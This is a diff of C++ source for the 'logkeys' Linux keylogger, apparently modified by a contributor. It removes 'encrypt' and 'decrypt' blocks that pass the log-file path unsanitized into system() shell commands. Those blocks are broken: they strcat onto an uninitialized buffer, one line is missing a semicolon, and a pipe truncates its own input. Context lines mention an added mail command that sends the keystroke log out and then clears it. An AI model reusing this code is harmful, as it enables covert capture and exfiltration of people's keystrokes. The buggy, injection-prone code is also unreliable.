@@ -475,23 +475,10 @@ int main(int argc, char **argv)
   
   int flag = 0;
 
+
   // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
   while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
     
-
-    // Decrypt log file
-    if (flag) {
-      char command[2500];
-      //cat file | ./128 > file
-      char *cat = "cat ";
-      char *rot = " | ./128 > "
-      strcat(command, cat);
-      strcat(command, args.logfile.c_str());
-      strcat(command, rot);
-      system(command);
-    }
-
-
 // these event.value-s aren't defined in <linux/input.h> ?
 #define EV_MAKE   1  // when key pressed
 #define EV_BREAK  0  // when key released
@@ -633,8 +620,6 @@ int main(int argc, char **argv)
     fflush(out);
     if (inc_size > 0) file_size += inc_size;
 
-
-
     // ADDED BY ELI
     // End of reading input loop: add in mail command (clear log file after sending mail) and encryption (?)
 
@@ -647,17 +632,6 @@ int main(int argc, char **argv)
       return system(command);
     }
 
-    // Encrypt log file
-    char command[2500];
-    //cat file | ./128 > file
-    char *cat = "cat ";
-    char *rot = " | ./128 > ";
-    strcat(command, cat);
-    strcat(command, args.logfile.c_str());
-    strcat(command, rot);
-    system(command);
-    flag = 1;
-    
   } // while (read(input_fd))
   
   // append final timestamp, close files and exit
@@ -678,4 +652,4 @@ int main(int argc, char** argv)
 {
   return logkeys::main(argc, argv);
 }
-// end
+
